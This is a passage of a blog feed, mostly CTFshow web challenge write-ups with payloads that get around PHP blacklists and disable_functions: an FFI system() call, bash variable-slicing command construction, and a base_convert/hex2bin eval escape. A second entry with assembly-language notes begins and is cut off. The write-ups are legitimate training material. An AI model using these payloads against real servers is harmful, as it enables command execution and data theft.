class="hljs-string">&#x27;root&#x27;</span>);<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$dbh</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&#x27;select load_file(&quot;/flag36.txt&quot;);&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$row</span>)&#123;<br><span class="hljs-title function_ invoke__">var_export</span>(<span class="hljs-variable">$row</span>);<br>&#125;<br><span class="hljs-keyword">die</span>();<br></code></pre></td></tr></table></figure><h1 id="Web-76"><a href="#Web-76" class="headerlink" title="Web 76"></a>Web 76</h1><p>和 Web 75 一样的方法</p><h1 id="Web-77"><a href="#Web-77" class="headerlink" title="Web 77"></a>Web 77</h1><p>列出文件还是能用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs url">c=$a = new DirectoryIterator(&quot;glob:///*&quot;);<br>foreach($a as $f)&#123;<br>    echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);<br>&#125;;exit();<br></code></pre></td></tr></table></figure><p>hint 说是 php7.4 的 [FFI]( <a href="https://www.php.net/manual/zh/ffi.cdef.php">https://www.php.net/manual/zh/ffi.cdef.php</a> <a href="https://www.php.cn/php-weizijiaocheng-415807.html">https://www.php.cn/php-weizijiaocheng-415807.html</a>)</p><p>这个 <code>FFI</code> 是外部函数接口，能在 php 中去调用 C 语言的函数</p><p>绕过姿势：<a href="https://xz.aliyun.com/news/9507">bypass disable_functions姿势总结</a> 的利用 PHP7.4 FFI 绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs url">c=<br>$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);<br>$ffi-&gt;system(&quot;/readflag /flag36x.txt &gt; /var/www/html/flagxx.txt&quot;);   <br>exit();<br></code></pre></td></tr></table></figure><p>然后访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">url/flagxx.txt<br></code></pre></td></tr></table></figure><h1 id="Web-118"><a href="#Web-118" class="headerlink" title="Web 118"></a>Web 118</h1><p>只有一个输入框，f12 发现有一句 <code>&lt;!-- system($code);--&gt;</code> 也就是说输入的内容会被 <code>system()</code> 函数执行，而且只剩下 <code>$</code>、<code>&#123;</code>、<code>&#125;</code>、<code>?</code> 、<code>.</code> 、<code>~</code> 等等字符和大写字母没有被 ban</p><p>可以用这些字符构建命令：<a href="https://www.cnblogs.com/sparkdev/p/9934595.html#title_path">常见 Bash 内置变量介绍</a></p><p>比如 <code>$PATH</code>、<code>$PWD</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/c0b74c7d52bfc6f9.png"></p><p>上面的 <code>$&#123;PATH:5:1&#125;$&#123;PATH:11:1&#125;</code> 输出了 <code>ls</code> ，这是因为 Linux 中的切片，在 Linux 中，<code>$&#123;var:offset:length&#125;</code> 为字符串切片形式，如上所示。当 <code>length</code> 为负数时，从尾部开始输出。</p><p><code>$&#123;PATH:5:1&#125;$&#123;PATH:11:1&#125;</code> 就是利用的 <code>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</code> 中第 6 位( offset +1)字符  <code>l</code>  和第 12 位字符  <code>s</code>，组合输出了 <code>ls</code>，因此我们可以构造想要的命令输出。</p><p>但是数字被 ban 了，无法知道某个字符位置，这时候就能想到  Shell 语言中的 <code>$(())</code>，它是等于 0 的，取反后为 -1，但是 <code>()</code> 也被 ban了，没事，可以用 <code>$&#123;&#125;</code> </p><p>对一个空变量取反可以拿到一样的效果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿butt3rf1y)-[/home/butt3rf1y]<br>└─# <span class="hljs-built_in">echo</span> $((N))<br>0<br><br>┌──(root㉿butt3rf1y)-[/home/butt3rf1y]<br>└─# <span class="hljs-built_in">echo</span> $((~N))<br>-1<br></code></pre></td></tr></table></figure><p>所以，我们可以构造一个<code>nl</code> 列出 flag 内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─# <span class="hljs-built_in">echo</span> <span class="hljs-variable">$&#123;PATH:~N&#125;</span><br>n<br></code></pre></td></tr></table></figure><p>然后在 <code>/var/www/html</code> 目录下可以拿到 <code>l</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿butt3rf1y)-[/var/www/html]<br>└─# <span class="hljs-built_in">echo</span> <span class="hljs-variable">$&#123;PWD:~N&#125;</span><br>l<br></code></pre></td></tr></table></figure><p>而我们的 flag 直接用通配符</p><p>综上所述，payload 为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;PATH:~N&#125;<span class="hljs-variable">$&#123;PWD:~N&#125;</span> ????????</span><br></code></pre></td></tr></table></figure><p>查看源代码找到 flag</p><h1 id="Web-119"><a href="#Web-119" class="headerlink" title="Web 119"></a>Web 119</h1><h2 id="nl"><a href="#nl" class="headerlink" title="nl"></a>nl</h2><p>用上一个 payload 已经不行了，<code>PATH</code> 被禁了，那么用 <code>PWD</code> 去构造，用 <code>whereis</code> 命令可以找到 <code>nl</code> 指令路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─# whereis <span class="hljs-built_in">nl</span><br><span class="hljs-built_in">nl</span>: /usr/bin/nl<br></code></pre></td></tr></table></figure><p>因为 <code>PATH</code> 不能用，那就用通配符 <code>?</code>，<code>nl</code> 就可以表示为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?$&#123;PWD:~N&#125;<br></code></pre></td></tr></table></figure><p>需要带上路径 <code>/usr/bin/</code>，但是 <code>/</code> 和小写字母也被 ban 了，还是可以用 <code>?</code> 代替</p><p>而输出 <code>$PWD</code> 就能知道第一位就是 <code>/</code>，所以我们可以截取出来，当我们用 <code>set</code> 查看环境变量的时候会发现</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">SHLVL=1<br></code></pre></td></tr></table></figure><p>因此我们可以输出 <code>SHLVL</code> 来表示 1</p><p>在 Linux 中，<code>$&#123;&#125;</code> 中变量前加 <code>#</code> 可以获取字符串长度，那么就能表示为如下形式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;#SHLVL&#125;</span><br></code></pre></td></tr></table></figure><p>因此构造出形如</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;PWD::<span class="hljs-variable">$&#123;#SHLVL&#125;</span>&#125;???<span class="hljs-variable">$&#123;PWD::<span class="hljs-variable">$&#123;#SHLVL&#125;</span>&#125;</span>???<span class="hljs-variable">$&#123;PWD::<span class="hljs-variable">$&#123;#SHLVL&#125;</span>&#125;</span>?<span class="hljs-variable">$&#123;PWD:~N&#125;</span> ????????</span><br></code></pre></td></tr></table></figure><p>这个 payload 为 :<code>/usr/bin/nl flag.xxx</code> 形式，因为 数字被 ban 了，所以 <code>$&#123;var:offset:length&#125;</code> 就可以简写成 <code>$&#123;var::length&#125;</code> 表示从 0 开始</p><p><code>SHLVL</code> 是记录多个 Bash 进程实例嵌套深度的累加器，比如说第一次打开 shell 时 <code>$SHLVL=1</code> ,然后在此 shell 中再打开一个 shell 时 <code>$SHLVL=2</code>，其实就是套娃的数量</p><h2 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h2><p>相同的步骤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/bin/cat<br></code></pre></td></tr></table></figure><p>构造出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;PWD:<span class="hljs-variable">$&#123;#&#125;</span>:<span class="hljs-variable">$&#123;#SHLVL&#125;</span>&#125;???<span class="hljs-variable">$&#123;PWD:<span class="hljs-variable">$&#123;#&#125;</span>:<span class="hljs-variable">$&#123;#SHLVL&#125;</span>&#125;</span>??<span class="hljs-variable">$&#123;HOME:<span class="hljs-variable">$&#123;#HOSTNAME&#125;</span>:<span class="hljs-variable">$&#123;#SHLVL&#125;</span>&#125;</span> ????????</span><br></code></pre></td></tr></table></figure><h1 id="Web-120"><a href="#Web-120" class="headerlink" title="Web 120"></a>Web 120</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>error_reporting(0);<br>highlight_file(__FILE__);<br>if(isset($_POST[&#x27;code&#x27;]))&#123;<br>    $code=$_POST[&#x27;code&#x27;];<br>    if(!preg_match(&#x27;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;, $code))&#123;    <br>        if(strlen($code)&gt;65)&#123;<br>            echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;;<br>        &#125;<br>        else&#123;<br>        echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.system($code).&#x27;&lt;/div&gt;&#x27;;<br>        &#125;<br>    &#125;<br>    else&#123;<br>     echo &#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;;<br>    &#125;<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>终于有源码了TVT</p><p>因为有了长度限制为 65，之前的超出限制了，把 <code>SHLVL</code> 换成变量 <code>#</code></p><p>于是 <code>$&#123;PWD::$&#123;SHLVL&#125;&#125;</code> -&gt; <code>$&#123;PWD::$&#123;##&#125;&#125;</code>构造 payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">code=$&#123;PWD::$&#123;##&#125;&#125;???$&#123;PWD::$&#123;##&#125;&#125;???$&#123;PWD::$&#123;##&#125;&#125;?$&#123;PWD:~N&#125; ????????<br></code></pre></td></tr></table></figure><h1 id="Web-121"><a href="#Web-121" class="headerlink" title="Web 121"></a>Web 121</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>error_reporting(0);<br>highlight_file(__FILE__);<br>if(isset($_POST[&#x27;code&#x27;]))&#123;<br>    $code=$_POST[&#x27;code&#x27;];<br>    if(!preg_match(&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;, $code))&#123;    <br>        if(strlen($code)&gt;65)&#123;<br>            echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;;<br>        &#125;<br>        else&#123;<br>        echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.system($code).&#x27;&lt;/div&gt;&#x27;;<br>        &#125;<br>    &#125;<br>    else&#123;<br>     echo &#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;;<br>    &#125;<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>ban 了很多，但是还是能用 <code>PWD</code> ，用  <code>/???/r??</code> 构造出路径  <code>bin/rev</code>  执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">code=$&#123;PWD::$&#123;##&#125;&#125;???$&#123;PWD::$&#123;##&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;##&#125;&#125;?? ????????<br></code></pre></td></tr></table></figure><p>然后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;galf&quot;</span> | rev<br></code></pre></td></tr></table></figure><h1 id="Web-122"><a href="#Web-122" class="headerlink" title="Web 122"></a>Web 122</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>error_reporting(0);<br>highlight_file(__FILE__);<br>if(isset($_POST[&#x27;code&#x27;]))&#123;<br>    $code=$_POST[&#x27;code&#x27;];<br>    if(!preg_match(&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;, $code))&#123;    <br>        if(strlen($code)&gt;65)&#123;<br>            echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;;<br>        &#125;<br>        else&#123;<br>        echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.system($code).&#x27;&lt;/div&gt;&#x27;;<br>        &#125;<br>    &#125;<br>    else&#123;<br>     echo &#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;;<br>    &#125;<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p><code>PWD</code> 和 <code>#</code> 都不能用了，hint 给的</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby">通过<span class="hljs-variable">$?</span>来实现的，<span class="hljs-variable">$?</span>是表示上一条命令执行结束后的传回值。通常<span class="hljs-number">0</span>代表执行成功，非<span class="hljs-number">0</span>代表执行有误<br><br><span class="hljs-symbol">payload:</span>code=&lt;A;<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">HOME</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-variable">$?</span>&#125;<span class="hljs-string">??</span><span class="hljs-string">?$</span>&#123;<span class="hljs-variable constant_">HOME</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-variable">$?</span>&#125;<span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">?$</span>&#123;<span class="hljs-variable constant_">RANDOM</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-variable">$?</span>&#125; <span class="hljs-string">??</span><span class="hljs-string">??</span>.<span class="hljs-string">??</span>?<br><span class="hljs-comment">#可能存在成功的机会，不断刷新</span><br></code></pre></td></tr></table></figure><p>随机，一直刷新就能出来</p><p><code>&lt;A</code> 是将 A 文件夹内的命令重定向到终端进行执行，由于没有文件 A 肯定就会报错，那么 <code>$?</code> 就为 1，用 <code>$&#123;HOME::$?&#125;</code> 得到 <code>/</code>，再用 <code>RANDOM</code> 随机数随机到 4 就能执行 <code>/bin/base64</code></p><h1 id="Web-124"><a href="#Web-124" class="headerlink" title="Web 124"></a>Web 124</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: 收集自网络<br># @Date:   2020-09-16 11:25:09<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-10-06 14:04:45<br><br>*/<br><br>error_reporting(0);<br>//听说你很喜欢数学，不知道你是否爱它胜过爱flag<br>if(!isset($_GET[&#x27;c&#x27;]))&#123;<br>    show_source(__FILE__);<br>&#125;else&#123;<br>    //例子 c=20-1<br>    $content = $_GET[&#x27;c&#x27;];<br>    if (strlen($content) &gt;= 80) &#123;<br>        die(&quot;太长了不会算&quot;);<br>    &#125;<br>    $blacklist = [&#x27; &#x27;, &#x27;\t&#x27;, &#x27;\r&#x27;, &#x27;\n&#x27;,&#x27;\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\[&#x27;, &#x27;\]&#x27;];<br>    foreach ($blacklist as $blackitem) &#123;<br>        if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123;<br>            die(&quot;请不要输入奇奇怪怪的字符&quot;);<br>        &#125;<br>    &#125;<br>    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp<br>    $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];<br>    preg_match_all(&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;, $content, $used_funcs);  <br>    foreach ($used_funcs[0] as $func) &#123;<br>        if (!in_array($func, $whitelist)) &#123;<br>            die(&quot;请不要输入奇奇怪怪的函数&quot;);<br>        &#125;<br>    &#125;<br>    //帮你算出答案<br>    eval(&#x27;echo &#x27;.$content.&#x27;;&#x27;);<br>&#125;<br></code></pre></td></tr></table></figure><p>只能用白名单里的这些函数，都是一些 Math 函数，里面有很多进制转换的函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php">base_convert-在任意进制之间转换数字<br><span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$num</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$from_base</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$to_base</span>): <span class="hljs-keyword">string</span><br><br>bindec-二进制转十进制<br><span class="hljs-title function_ invoke__">bindec</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$binary_string</span>): <span class="hljs-keyword">int</span>|<span class="hljs-keyword">float</span><br>    <br>decbin-十进制转换为二进制<br><span class="hljs-title function_ invoke__">decbin</span>(<span class="hljs-keyword">int</span> <span class="hljs-variable">$num</span>): <span class="hljs-keyword">string</span><br><br>dechex-十进制转换为十六进制<br><span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-keyword">int</span> <span class="hljs-variable">$num</span>): <span class="hljs-keyword">string</span><br>    <br>decoct-十进制转换为八进制<br><span class="hljs-title function_ invoke__">decoct</span>(<span class="hljs-keyword">int</span> <span class="hljs-variable">$num</span>): <span class="hljs-keyword">string</span><br><br>hexdec-十六进制转换为十进制<br><span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$hex_string</span>): <span class="hljs-keyword">int</span>|<span class="hljs-keyword">float</span><br></code></pre></td></tr></table></figure><p>我们只能构造函数或构造字母，<code>base_convert()</code> 函数能实现任意进制转换，在 36 进制中包含了所有的数字和字母，所以只需要将构造出 <code>hex2bin</code> 函数，然后再用 <code>hexdex</code> 函数转换成十进制，当我们构造的时候需要反过来执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-string">&#x27;hex2bin&#x27;</span>, <span class="hljs-number">36</span>, <span class="hljs-number">10</span>);<br>&gt;&gt;<span class="hljs-number">37907361743</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-string">&quot;_GET&quot;</span>));<br>&gt;&gt;<span class="hljs-number">1598506324</span><br></code></pre></td></tr></table></figure><p>拿函数作为参数构造出<code>c=$_GET[1]($_GET[2])&amp;1=system&amp;2=cat flag</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=<span class="hljs-variable">$pi</span>=<span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">1598506324</span>));<span class="hljs-variable">$$pi</span>&#123;<span class="hljs-number">1</span>&#125;(<span class="hljs-variable">$$pi</span>&#123;<span class="hljs-number">2</span>&#125;);&amp;<span class="hljs-number">1</span>=system&amp;<span class="hljs-number">2</span>=tac f*<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>CTFshow</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>汇编语言</title>
    <link href="/2025/03/12/Re-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    <url>/2025/03/12/Re-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/</url>
    
    <content type="html"><![CDATA[<p>去年学的东西了，突然看到了，想了一下还是传上来，王爽的《汇编语言》第四版（第一本完全看完的跟计算机有关的书www）</p><span id="more"></span><h1 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h1><h2 id="1-1-机器语言"><a href="#1-1-机器语言" class="headerlink" title="1.1 机器语言"></a>1.1 机器语言</h2><h2 id="1-2-汇编语言产生"><a href="#1-2-汇编语言产生" class="headerlink" title="1.2 汇编语言产生"></a>1.2 汇编语言产生</h2><p>汇编语言的主体是汇编指令，汇编指令是机器的助记符。</p><h2 id="1-3-汇编语言的组成"><a href="#1-3-汇编语言的组成" class="headerlink" title="1.3 汇编语言的组成"></a>1.3 汇编语言的组成</h2><p>1.汇编指令（机器码助记符）</p><p>2.伪指令（由编译器）</p><p>3.其他符号（由编译器识别）</p><h2 id="1-4-存储器"><a href="#1-4-存储器" class="headerlink" title="1.4 存储器"></a>1.4 存储器</h2><p>cpu,内存，磁盘</p><h2 id="1-5-指令和数据"><a href="#1-5-指令和数据" class="headerlink" title="1.5 指令和数据"></a>1.5 指令和数据</h2><h2 id="1-6-存储单元"><a href="#1-6-存储单元" class="headerlink" title="1.6 存储单元"></a>1.6 存储单元</h2><p>存储器分为若干个存储单元，从 0 开始编号</p><h2 id="1-7-CPU对存储器进行读写"><a href="#1-7-CPU对存储器进行读写" class="headerlink" title="1.7 CPU对存储器进行读写"></a>1.7 CPU对存储器进行读写</h2><p>CPU 对数据进行读写，需要和外部器件进行信息交互：</p><p><strong>1.存储单元地址（地址信息）</strong></p><p><strong>2.器件的选择，读或写命令（控制信息）</strong></p><p><strong>3.读或写的数据（数据信息）</strong></p><p>连接 CPU 和其他芯片</p><h2 id="1-8-地址总线"><a href="#1-8-地址总线" class="headerlink" title="1.8 地址总线"></a>1.8 地址总线</h2><p>CPU 通过地址总线指定存储单元</p><p>地址总线能传送多少个不同的信息，CPU 就可以对多少个存储单元进行寻址。</p><p>一个 CPU 有 N 根地址总线，则可以说这个 CPU 地址总线宽度为 N，CPU 可以寻找 2 的 N 次方个内存单元。</p><h2 id="1-9-数据总线"><a href="#1-9-数据总线" class="headerlink" title="1.9 数据总线"></a>1.9 数据总线</h2><p>CPU和其他器件的数据传输，数据总线宽度决定了 CPU 和外界的数据传输速度。</p><h2 id="1-10-控制总线"><a href="#1-10-控制总线" class="headerlink" title="1.10 控制总线"></a>1.10 控制总线</h2><p>CPU 对外部器件的控制，控制总线是不同控制线的集合</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>1）汇编指令是机器指令的助记符，同机器指令一一对应；</p><p>2）每一种 CPU 都有自己的汇编指令集；</p><p>3）CPU 可以直接使用的信息在存储器中存放；</p><p>4）在存储器中指令和数据没有任何区别，都是二进制信息；</p><p>5）存储单元从零开始存储顺序编号；</p><p>6）一个存储单元可以存储 8 个 bite(b);</p><p>7)每一个 CPU 芯片都有许多管脚，管脚和总线相连。</p><p>​<strong>地址总线宽度决定了 CPU 的寻址能力；</strong></p><p>​<strong>数据总线宽度决定了 CPU 与其他器件进行数据传时的一次数据传输量；</strong></p><p>​<strong>控制总线宽度决定了 CPU 对系统中其他器件的控制能力。</strong></p><h2 id="1-11-主板、接口卡"><a href="#1-11-主板、接口卡" class="headerlink" title="1.11 主板、接口卡"></a>1.11 主板、接口卡</h2><h2 id="1-12-各类存储器芯片"><a href="#1-12-各类存储器芯片" class="headerlink" title="1.12 各类存储器芯片"></a>1.12 各类存储器芯片</h2><p><strong>随机存储器（RAM）、只读存储器（ROM）</strong></p><p>随机存储器 RAM</p><p>装有 BIOS 的 ROM</p><p>接口卡上的 RAM</p><h2 id="1-13各类存储器芯片"><a href="#1-13各类存储器芯片" class="headerlink" title="1.13各类存储器芯片"></a>1.13各类存储器芯片</h2><h5 id="装有-BIOS-的-ROM"><a href="#装有-BIOS-的-ROM" class="headerlink" title="装有 BIOS 的 ROM"></a>装有 BIOS 